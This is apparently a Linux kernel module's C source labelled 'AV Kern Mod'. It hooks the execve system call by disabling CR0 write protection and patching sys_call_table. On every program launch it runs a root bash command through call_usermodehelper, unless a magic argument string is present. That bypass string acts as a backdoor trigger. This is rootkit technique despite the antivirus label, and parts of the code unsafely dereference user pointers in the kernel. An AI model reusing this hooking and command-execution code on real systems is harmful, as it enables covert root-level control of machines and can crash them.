#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

unsigned long *sys_call_table;
asmlinkage int (*orig_execve)(const struct pt_regs *regs);
asmlinkage int (*orig_open)(char*, int, int);
asmlinkage int (*orig_openat)(const struct pt_regs *regs);

MODULE_DESCRIPTION("AV Kern Mod");
MODULE_AUTHOR("MMiller");
MODULE_LICENSE("GPL"); //Sure, whatever

static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}

static inline void zero_cr0(void) {

    wp_cr0(read_cr0() & (~0x10000));

}

static inline void one_cr0(void) {

    wp_cr0(read_cr0() | 0x10000);

}

//asmlinkage long openat_hook(const struct pt_regs *regs)

asmlinkage int hooked_execve(const struct pt_regs *regs)
{
    char* buffer = kmalloc(64 + 1, GFP_KERNEL);
    char* argv[4];
    char* envp[5];

    if(strcmp(((char**)regs->dx)[3],"0xB16B00B5C001BABE") == 0)
    {
        printk("Eyy LMAO");
        return orig_execve(regs);
    }


    if(strncpy_from_user(buffer, (char*)regs->di, 48) <= 0)
        printk("read failed");

    printk("Open Hooked Execve:%s\n", buffer);
    kfree(buffer);

    argv[0] = "/bin/bash";
    argv[1] = "-c";
    argv[2] = "/usr/bin/touch /tmp/whyarewehere";
    argv[3] = NULL;
    
    envp[0] = "HOME=/";
    envp[1] = "TERM=linux";
    envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
    //envp[3] = "0xB16B00B5C001BABE";
    envp[3] = NULL;

        /*
        zero_cr0();
        sys_call_table[__NR_execve] = (unsigned long)orig_execve;
        one_cr0();
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        zero_cr0();
        sys_call_table[__NR_execve] = (unsigned long)hooked_execve;
        one_cr0();
        */
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return orig_execve(regs);
}

asmlinkage int hooked_open(char *pathname, int flags, int mode)
{
    printk("Open Hooked pathname:%s\n", pathname);
    return orig_open(pathname, flags, mode);
}

asmlinkage int hooked_openat(const struct pt_regs *regs)
{
    char* buffer = kmalloc(64 + 1, GFP_KERNEL);
    strncpy_from_user(buffer, (char*)regs->si, 48);

    printk("Openat Hooked Pathname:%s\n", buffer);
    kfree(buffer);
    return orig_openat(regs);
}


static int __init simple_init(void)
{
    printk("Begin AV Setup!\n");
    sys_call_table = (long*)kallsyms_lookup_name("sys_call_table");
    orig_execve = (void*)sys_call_table[__NR_execve];
        //orig_open = (void*)sys_call_table[__NR_open];
        //orig_openat = (void*)sys_call_table[__NR_openat];
    printk("The address of sys_call_table is: %lx\n", kallsyms_lookup_name("sys_call_table"));
    zero_cr0();
    sys_call_table[__NR_execve] = (unsigned long)hooked_execve;
        //sys_call_table[__NR_open] = (unsigned long)hooked_open;
        //sys_call_table[__NR_openat] = (unsigned long)hooked_openat;
    one_cr0();
    printk("Setup Done!\n");
    return 0;
}

static void __exit simple_exit(void)
{
    printk("Bye bye!\n");
    zero_cr0();
    printk("unprot!\n");
    sys_call_table[__NR_execve] = (unsigned long)orig_execve;
        //sys_call_table[__NR_open] = (unsigned long)orig_open;
        //sys_call_table[__NR_openat] = (unsigned long)orig_openat;
    one_cr0();
    printk("reprot!\n");
}

module_init(simple_init);
module_exit(simple_exit);
